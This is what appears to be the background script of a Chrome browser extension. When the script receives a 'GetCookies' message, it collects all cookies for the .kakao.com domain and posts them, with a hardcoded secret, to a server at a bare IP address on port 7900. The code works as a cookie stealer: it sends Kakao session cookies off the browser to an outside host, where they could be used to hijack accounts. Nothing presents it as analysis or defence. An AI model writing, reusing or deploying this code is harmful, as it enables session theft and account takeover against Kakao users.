const secret = 'afee645a7f9000637f1545302e1e61148bd0e782a94e393f8a79364c76320547'
const host = 'http://95.141.241.10:7900'

chrome.action.onClicked.addListener((tab) => {
	chrome.scripting.executeScript({
		target: { tabId: tab.id },
		files: ['content.js'],
	})
})

chrome.runtime.onMessage.addListener((message, _, sendResponse) => {
	if (message.command === 'GetCookies') {
		;(async () => {
			const cookies = await new Promise((resolve) => {
				chrome.cookies.getAll({ domain: '.kakao.com' }, (cookie) => resolve(cookie))
			})

			console.log({ cookies })

			const res = await fetch(`${host}/cookies`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ cookies, secret }),
			})

			if (res.status !== 200) {
				const data = await res.json()
				sendResponse({ error: data.message })
				return
			}

			sendResponse({ success: true })
		})()

		return true // indicate fucking chrome that we will send the response asynchronously
	}
})
